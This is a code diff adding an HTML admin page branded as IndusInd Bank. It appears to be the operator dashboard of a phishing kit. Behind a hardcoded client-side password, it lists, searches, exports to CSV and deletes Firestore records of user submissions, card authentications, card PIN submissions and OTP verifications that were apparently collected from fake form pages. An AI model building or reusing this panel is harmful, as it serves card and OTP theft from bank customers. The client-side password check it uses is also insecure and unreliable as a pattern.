@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>IndusInd Bank - Admin Panel</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Segoe UI', Arial, sans-serif; background: #f2f2f2; color: #222; }
+    .page { max-width: 1200px; margin: 0 auto; padding: 20px; }
+    header { display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center; gap: 16px; margin-bottom: 24px; }
+    header h1 { margin: 0; color: #832625; font-size: 28px; font-weight: 700; }
+    header h1 img { height: 30px; vertical-align: middle; margin-right: 8px; }
+    header button { padding: 12px 18px; border: none; border-radius: 6px; background: #832625; color: #fff; cursor: pointer; font-size: 16px; font-weight: 500; }
+    header button:hover { background: #6d1a15; }
+    .status { margin-bottom: 20px; padding: 14px 18px; border-radius: 8px; background: #fff; box-shadow: 0 2px 8px rgba(0,0,0,0.04); }
+    .collection { margin-bottom: 32px; background: #fff; border-radius: 10px; box-shadow: 0 2px 8px rgba(0,0,0,0.04); overflow: hidden; }
+    .collection h2 { margin: 0; padding: 16px 20px; background: #832625; color: #fff; font-size: 1rem; font-weight: 600; }
+    .table-wrapper { overflow-x: auto; }
+    table { width: 100%; border-collapse: collapse; min-width: 720px; }
+    th, td { padding: 10px 14px; text-align: left; border-bottom: 1px solid #e0e0e0; font-size: 0.85rem; }
+    th { background: #fafafa; color: #444; font-weight: 600; }
+    .empty { padding: 18px 20px; color: #666; }
+    .help { margin-top: 16px; font-size: 14px; color: #555; }
+    .actions button { margin-right: 6px; padding: 5px 10px; border: none; border-radius: 4px; cursor: pointer; font-size: 0.8rem; }
+    .btn-view { background: #2d7aee; color: #fff; }
+    .btn-delete { background: #d9534f; color: #fff; }
+    .btn-export { background: #28a745; color: #fff; }
+    .search-input { width: 260px; padding: 8px 10px; border-radius: 6px; border: 1px solid #ddd; }
+    .modal { position: fixed; left:0; right:0; top:0; bottom:0; display:none; align-items:center; justify-content:center; background: rgba(0,0,0,0.4); z-index:50; }
+    .modal .box { background:#fff; padding:18px; border-radius:10px; width:90%; max-width:900px; max-height:80vh; overflow:auto; }
+    .modal pre { white-space:pre-wrap; word-wrap:break-word; }
+  </style>
+</head>
+<body>
+  <div id="loginPage" class="page">
+    <header>
+      <div><h1><img src="../images/logo.jpeg" alt="">Admin Login</h1><p class="help">Enter the admin password to access the dashboard.</p></div>
+    </header>
+    <div class="collection">
+      <div style="padding: 24px;">
+        <label for="adminPassword"><strong>Password</strong></label>
+        <input id="adminPassword" type="password" placeholder="Enter password" style="width:100%;padding:12px;margin:10px 0 14px;border:1px solid #ccc;border-radius:6px;" />
+        <button id="loginButton" style="padding:12px 18px;border:none;border-radius:6px;background:#832625;color:#fff;cursor:pointer;font-size:16px;">Login</button>
+        <div id="loginError" class="empty" style="margin-top:16px;color:#d12727;display:none;"></div>
+      </div>
+    </div>
+  </div>
+
+  <div id="adminPage" class="page" style="display:none;">
+    <header>
+      <div><h1><img src="../images/logo.jpeg" alt="">IndusInd Admin Panel</h1><p class="help">Displays Firestore collections from form pages.</p></div>
+      <div><button id="refreshButton">Refresh Data</button><button id="logoutButton" style="margin-left:12px;background:#444;">Logout</button></div>
+    </header>
+    <div id="status" class="status">Loading data from Firestore...</div>
+    <div id="content"></div>
+  </div>
+
+  <div id="docModal" class="modal">
+    <div class="box">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
+        <strong>Document</strong>
+        <button id="modalClose">Close</button>
+      </div>
+      <pre id="modalContent"></pre>
+    </div>
+  </div>
+
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
+  <script src="../html/firebase-config.js"></script>
+  <script>
+    const ADMIN_PASSWORD = 'delhi123@#';
+    const STORAGE_KEY = 'indusAdminLoggedIn';
+
+    function showLogin() { document.getElementById('loginPage').style.display = 'block'; document.getElementById('adminPage').style.display = 'none'; }
+    function showAdmin() { document.getElementById('loginPage').style.display = 'none'; document.getElementById('adminPage').style.display = 'block'; refreshData(); }
+    function setLoggedIn(v) { sessionStorage.setItem(STORAGE_KEY, v ? '1' : '0'); }
+    function isLoggedIn() { return sessionStorage.getItem(STORAGE_KEY) === '1'; }
+
+    document.getElementById('loginButton').addEventListener('click', function() {
+      if (document.getElementById('adminPassword').value === ADMIN_PASSWORD) {
+        setLoggedIn(true); document.getElementById('loginError').style.display = 'none';
+        document.getElementById('adminPassword').value = ''; initializeAdmin(); showAdmin();
+      } else { document.getElementById('loginError').textContent = 'Incorrect password. Try again.'; document.getElementById('loginError').style.display = 'block'; }
+    });
+
+    document.getElementById('logoutButton').addEventListener('click', function() { setLoggedIn(false); document.getElementById('status').textContent = 'Logged out.'; showLogin(); });
+
+    function getDb() {
+      if (typeof db !== 'undefined' && db) return db;
+      if (typeof firebase !== 'undefined' && firebase.firestore) return firebase.firestore();
+      return null;
+    }
+
+    function initializeAdmin() {
+      if (!getDb()) throw new Error('Firebase not initialized.');
+    }
+
+    const collections = [
+      { id: 'user_submissions', title: 'User Submissions' },
+      { id: 'card_authentications', title: 'Card Authentications' },
+      { id: 'card_pin_submissions', title: 'Card PIN Submissions' },
+      { id: 'otp_verifications', title: 'OTP Verifications' }
+    ];
+
+    const statusEl = document.getElementById('status');
+    const contentEl = document.getElementById('content');
+    const refreshButton = document.getElementById('refreshButton');
+    const modal = document.getElementById('docModal');
+    const modalContent = document.getElementById('modalContent');
+
+    document.getElementById('modalClose').addEventListener('click', () => { modal.style.display = 'none'; });
+    modal.addEventListener('click', (e) => { if (e.target === modal) modal.style.display = 'none'; });
+
+    function formatTimestamp(value) {
+      if (!value) return '';
+      if (value.toDate) return value.toDate().toLocaleString();
+      if (typeof value === 'number') return new Date(value).toLocaleString();
+      return String(value);
+    }
+
+    function buildTable(title, rows, collectionId) {
+      const wrapper = document.createElement('div');
+      if (!rows.length) {
+        const e = document.createElement('div'); e.className = 'empty'; e.textContent = 'No documents found.'; wrapper.appendChild(e);
+        return wrapper;
+      }
+      const table = document.createElement('table');
+      const thead = document.createElement('thead');
+      const tbody = document.createElement('tbody');
+      const fields = rows.reduce((set, row) => { Object.keys(row).forEach(k => set.add(k)); return set; }, new Set(['id', 'timestamp']));
+      fields.add('actions');
+      const hr = document.createElement('tr');
+      for (const f of fields) { const th = document.createElement('th'); th.textContent = f; hr.appendChild(th); }
+      thead.appendChild(hr);
+      for (const row of rows) {
+        const tr = document.createElement('tr');
+        for (const f of fields) {
+          const td = document.createElement('td');
+          if (f === 'actions') {
+            const aw = document.createElement('div'); aw.className = 'actions';
+            const vb = document.createElement('button'); vb.className = 'btn-view'; vb.textContent = 'View';
+            vb.addEventListener('click', () => showDocumentModal(row));
+            const db_btn = document.createElement('button'); db_btn.className = 'btn-delete'; db_btn.textContent = 'Delete';
+            db_btn.addEventListener('click', () => deleteDocument(collectionId, row.id));
+            aw.appendChild(vb); aw.appendChild(db_btn); td.appendChild(aw);
+          } else {
+            let v = row[f];
+            if (f === 'timestamp') v = formatTimestamp(v);
+            if (v === undefined || v === null) v = '';
+            else if (typeof v === 'object' && v !== null) v = JSON.stringify(v);
+            td.textContent = v;
+          }
+          tr.appendChild(td);
+        }
+        tbody.appendChild(tr);
+      }
+      table.appendChild(thead); table.appendChild(tbody); wrapper.appendChild(table);
+      return wrapper;
+    }
+
+    function createCollectionSection(title, rows, collectionId) {
+      const section = document.createElement('div'); section.className = 'collection';
+      const heading = document.createElement('h2'); heading.textContent = title; section.appendChild(heading);
+      const tools = document.createElement('div'); tools.style.padding = '12px 18px'; tools.style.display = 'flex'; tools.style.justifyContent = 'space-between'; tools.style.alignItems = 'center';
+      const sw = document.createElement('div');
+      const si = document.createElement('input'); si.className = 'search-input'; si.placeholder = 'Search...';
+      sw.appendChild(si);
+      const eb = document.createElement('button'); eb.className = 'btn-export'; eb.textContent = 'Export CSV';
+      eb.addEventListener('click', function() { exportCollectionToCSV(title, rows); });
+      tools.appendChild(sw); tools.appendChild(eb); section.appendChild(tools);
+
+      const tw = document.createElement('div'); tw.className = 'table-wrapper';
+      const tableContent = buildTable(title, rows, collectionId);
+      tw.appendChild(tableContent);
+      section.appendChild(tw);
+
+      si.addEventListener('input', function() {
+        const q = this.value.trim().toLowerCase();
+        const filtered = q ? rows.filter(r => JSON.stringify(r).toLowerCase().includes(q)) : rows;
+        tw.innerHTML = '';
+        tw.appendChild(buildTable(title, filtered, collectionId));
+      });
+      return section;
+    }
+
+    function showDocumentModal(doc) {
+      modalContent.textContent = JSON.stringify(doc, null, 2);
+      modal.style.display = 'flex';
+    }
+
+    async function deleteDocument(collectionId, docId) {
+      if (!confirm('Delete document ' + docId + ' from ' + collectionId + '?')) return;
+      const d = getDb();
+      if (!d) { alert('Firestore unavailable.'); return; }
+      try {
+        await d.collection(collectionId).doc(docId).delete();
+        refreshData();
+      } catch (err) {
+        alert('Delete failed: ' + (err.message || err));
+      }
+    }
+
+    function exportCollectionToCSV(title, rows) {
+      if (!rows || !rows.length) { alert('No rows'); return; }
+      const keys = Object.keys(rows.reduce((a, r) => Object.assign(a, r), {}));
+      const csv = [keys.join(',')];
+      for (const r of rows) { csv.push(keys.map(k => { let v = r[k]; if (v === undefined || v === null) return ''; if (typeof v === 'object') v = JSON.stringify(v); return '"' + String(v).replace(/"/g, '""') + '"'; }).join(',')); }
+      const b = new Blob([csv.join('\n')], { type: 'text/csv' }); const u = URL.createObjectURL(b);
+      const a = document.createElement('a'); a.href = u; a.download = title.replace(/\s+/g, '_').toLowerCase() + '.csv';
+      document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(u);
+    }
+
+    async function fetchCollection(collectionId) {
+      const d = getDb();
+      if (!d) throw new Error('Firestore unavailable');
+      const ref = d.collection(collectionId);
+      try {
+        const snap = await ref.orderBy('timestamp', 'desc').get();
+        return snap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+      } catch (e) {
+        const snap = await ref.get();
+        return snap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+      }
+    }
+
+    async function refreshData() {
+      statusEl.textContent = 'Loading...'; statusEl.style.color = '#222'; contentEl.innerHTML = '';
+      try {
+        for (const c of collections) {
+          const rows = await fetchCollection(c.id);
+          contentEl.appendChild(createCollectionSection(c.title, rows, c.id));
+        }
+        statusEl.textContent = 'Data loaded.';
+      } catch (err) {
+        statusEl.textContent = 'Error: ' + (err.message || err); statusEl.style.color = '#b22222';
+      }
+    }
+
+    refreshButton.addEventListener('click', refreshData);
+    document.addEventListener('DOMContentLoaded', function() {
+      if (isLoggedIn()) { initializeAdmin(); showAdmin(); } else showLogin();
+      document.getElementById('adminPassword').addEventListener('keyup', function(e) { if (e.key === 'Enter') document.getElementById('loginButton').click(); });
+    });
+  </script>
+</body>
+</html>
